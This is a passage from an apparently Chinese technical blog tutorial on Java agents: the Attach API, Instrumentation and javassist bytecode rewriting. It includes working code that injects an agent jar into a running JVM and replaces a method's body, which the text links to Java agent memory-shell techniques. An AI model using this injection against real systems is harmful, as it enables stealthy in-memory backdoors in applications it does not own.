punctuation">.</span> <span class="token punctuation">}</span>    <span class="token comment">// 根据pid连接到JVM</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">VirtualMachine</span> <span class="token function">attach</span><span class="token punctuation">(</span><span class="token class-name">String</span> id<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span>    <span class="token comment">// 断开连接</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token comment">// 加载agent，agentmain方法靠的就是这个方法</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">loadAgent</span><span class="token punctuation">(</span><span class="token class-name">String</span> agent<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>根据提供的api，可以写出一个attacher<br>实现注入的代码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc</span><span class="token punctuation">;</span><span class="token comment">/** * jdk&gt;=9 */</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span></span><span class="token class-name">AgentInitializationException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span></span><span class="token class-name">AgentLoadException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span></span><span class="token class-name">AttachNotSupportedException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span></span><span class="token class-name">VirtualMachine</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AgentMain</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">AgentLoadException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">AgentInitializationException</span><span class="token punctuation">,</span> <span class="token class-name">AttachNotSupportedException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> id <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">String</span> jarName <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"id ==&gt; "</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"jarName ==&gt; "</span> <span class="token operator">+</span> jarName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">VirtualMachine</span> virtualMachine <span class="token operator">=</span> <span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>virtualMachine<span class="token punctuation">.</span><span class="token function">loadAgent</span><span class="token punctuation">(</span>jarName<span class="token punctuation">)</span><span class="token punctuation">;</span>virtualMachine<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ends"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>通过pid向对应java程序进程注入附加Agent<br>执行这段代码，就能将jar包附加上对应的进程</p><h4 id="VirtualMachineDescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h4><p>com.sun.tools.attach.VirtualMachineDescriptor类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>drunkbaby</span><span class="token punctuation">;</span>    <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span></span><span class="token class-name">VirtualMachine</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span></span><span class="token class-name">VirtualMachineDescriptor</span></span><span class="token punctuation">;</span>    <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> get_PID <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">VirtualMachineDescriptor</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">VirtualMachineDescriptor</span> vmd <span class="token operator">:</span> list<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//遍历每一个正在运行的JVM，如果JVM名称为common.jar则返回其PID</span><span class="token keyword">if</span><span class="token punctuation">(</span>vmd<span class="token punctuation">.</span><span class="token function">displayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"common.jar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>vmd<span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><p>如果我们启动一个comm.jar<br>也可以使用这个类的方法,使用如下代码注入Agent，就不要手动找pid了</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span></span><span class="token class-name">Agent</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Attacher</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">AgentLoadException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">AgentInitializationException</span><span class="token punctuation">,</span> <span class="token class-name">AttachNotSupportedException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> agentJar<span class="token operator">=</span><span class="token string">"F:\\code\\java\\myAgent\\myAgent\\target\\artifacts\\myAgent_jar\\myAgent.jar"</span><span class="token punctuation">;</span><span class="token comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">VirtualMachineDescriptor</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">VirtualMachineDescriptor</span> vmd <span class="token operator">:</span> list<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//遍历每一个正在运行的JVM，如果JVM名称为common.jar则返回其PID</span><span class="token keyword">if</span><span class="token punctuation">(</span>vmd<span class="token punctuation">.</span><span class="token function">displayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"common.jar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token class-name">VirtualMachine</span> virtualMachine <span class="token operator">=</span> <span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>vmd<span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>virtualMachine<span class="token punctuation">.</span><span class="token function">loadAgent</span><span class="token punctuation">(</span>agentJar<span class="token punctuation">)</span><span class="token punctuation">;</span>virtualMachine<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"attached pid "</span><span class="token operator">+</span>vmd<span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"attached jar "</span><span class="token operator">+</span>agentJar<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>以附加agentmain的方式可以不断使用上面程序进行注入<br><img src="/img/5-4/8.png"><br>这里就附加了三次</p><h2 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h2><p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p><p>上面的只是附加运行代码，而Instrumentation能实现读取、修改已加载的字节码操作</p><p>其在 Java 中是一个接口，常用方法如下</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Instrumentation</span> <span class="token punctuation">{</span>        <span class="token comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span>    <span class="token keyword">void</span> <span class="token function">addTransformer</span><span class="token punctuation">(</span><span class="token class-name">ClassFileTransformer</span> transformer<span class="token punctuation">,</span> <span class="token keyword">boolean</span> canRetransform<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span>    <span class="token keyword">void</span> <span class="token function">addTransformer</span><span class="token punctuation">(</span><span class="token class-name">ClassFileTransformer</span> transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//删除一个类转换器</span>    <span class="token keyword">boolean</span> <span class="token function">removeTransformer</span><span class="token punctuation">(</span><span class="token class-name">ClassFileTransformer</span> transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span>    <span class="token keyword">void</span> <span class="token function">retransformClasses</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> classes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">UnmodifiableClassException</span><span class="token punctuation">;</span>       <span class="token comment">//判断一个类是否被修改</span>    <span class="token keyword">boolean</span> <span class="token function">isModifiableClass</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> theClass<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 获取目标已经加载的类。</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"rawtypes"</span><span class="token punctuation">)</span>    <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getAllLoadedClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//获取一个对象的大小</span>    <span class="token keyword">long</span> <span class="token function">getObjectSize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> objectToSize<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><h3 id="ClassFileTransformer"><a href="#ClassFileTransformer" class="headerlink" title="ClassFileTransformer"></a>ClassFileTransformer</h3><p>转换类文件，该接口下只有一个方法：transform，重写该方法即可转换任意类文件，并返回新的被取代的类文件，在 java agent 内存马中便是在该方法下重写恶意代码，从而修改原有类文件代码逻辑，与 addTransformer 搭配使用。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。  </span>    <span class="token keyword">void</span> <span class="token function">addTransformer</span><span class="token punctuation">(</span><span class="token class-name">ClassFileTransformer</span> transformer<span class="token punctuation">,</span> <span class="token keyword">boolean</span> canRetransform<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>简单概括一下：</p><ol><li>使用Instrumentation.addTransformer()来加载一个转换器。</li><li>转换器的返回结果（transform()方法的返回值）将成为转换后的字节码。</li><li>对于没有加载的类，会使用ClassLoader.defineClass()定义它；对于已经加载的类，会使用ClassLoader.redefineClasses()重新定义，并配合Instrumentation.retransformClasses进行转换。</li></ol><p>下面给出一个修改已加载类的例子<br>程序运行下面代码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span></span><span class="token class-name">Agent</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token static">sleep</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SayHello</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"hello world "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>编写agent：<br>编写一个ClassFileTransformer的实现类，重写transform方法，然后使用javassist修改方法体</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>transformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassClassPath</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtMethod</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">ClassFileTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">IllegalClassFormatException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">ProtectionDomain</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello_Transform</span> <span class="token keyword">implements</span> <span class="token class-name">ClassFileTransformer</span> <span class="token punctuation">{</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> loader<span class="token punctuation">,</span> <span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> classBeingRedefined<span class="token punctuation">,</span> <span class="token class-name">ProtectionDomain</span> protectionDomain<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classfileBuffer<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IllegalClassFormatException</span> <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token comment">//获取CtClass 对象的容器 ClassPool</span><span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//添加额外的类搜索路径</span><span class="token keyword">if</span> <span class="token punctuation">(</span>classBeingRedefined <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">ClassClassPath</span> ccp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>classBeingRedefined<span class="token punctuation">)</span><span class="token punctuation">;</span>classPool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span>ccp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//获取目标类</span><span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.yyjccc.Agent.SayHello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取目标方法</span><span class="token class-name">CtMethod</span> ctMethod <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置方法体</span><span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token string">"{System.out.println(\"Hacker!\");}"</span><span class="token punctuation">;</span>ctMethod<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//返回目标类字节码</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> bytes<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>agentmain</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>transformer<span class="token punctuation">.</span></span><span class="token class-name">Hello_Transform</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">Instrumentation</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">UnmodifiableClassException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvalAgent</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">agentmain</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">UnmodifiableClassException</span> <span class="token punctuation">{</span><span class="token class-name">Class</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> classes <span class="token operator">=</span> inst<span class="token punctuation">.</span><span class="token function">getAllLoadedClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取目标JVM加载的全部类</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Class</span> cls <span class="token operator">:</span> classes<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"com.yyjccc.Agent.SayHello"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//添加一个transformer到Instrumentation，并重新触发目标类加载</span>inst<span class="token punctuation">.</span><span class="token function">addTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Hello_Transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>inst<span class="token punctuation">.</span><span class="token function">retransformClasses</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>MANFIEST.MF设置运行可以重新类加载</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Manifest</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">1.0</span><span class="token class-name">Premain</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span></span>PerMain</span><span class="token class-name">Agent</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span></span>EvalAgent</span><span class="token class-name">Can</span><span class="token operator">-</span><span class="token class-name">Redefine</span><span class="token operator">-</span><span class="token class-name">Classes</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token class-name">Can</span><span class="token operator">-</span><span class="token class-name">Retransform</span><span class="token operator">-</span><span class="token class-name">Classes</span><span class="token operator">:</span> <span class="token boolean">true</span></code></pre><p>最后打jar包</p><p>然后注入</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span></span><span class="token class-name">Agent</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Attacher</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">AgentLoadException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">AgentInitializationException</span><span class="token punctuation">,</span> <span class="token class-name">AttachNotSupportedException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> agentJar<span class="token operator">=</span><span class="token string">"F:\\code\\java\\myAgent\\myAgent\\target\\artifacts\\myAgent_jar\\myAgent.jar"</span><span class="token punctuation">;</span><span class="token comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">VirtualMachineDescriptor</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">VirtualMachineDescriptor</span> vmd <span class="token operator">:</span> list<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//遍历每一个正在运行的JVM，如果JVM名称为common.jar则返回其PID</span><span class="token keyword">if</span><span class="token punctuation">(</span>vmd<span class="token punctuation">.</span><span class="token function">displayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"common.jar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token class-name">VirtualMachine</span> virtualMachine <span class="token operator">=</span> <span class="token 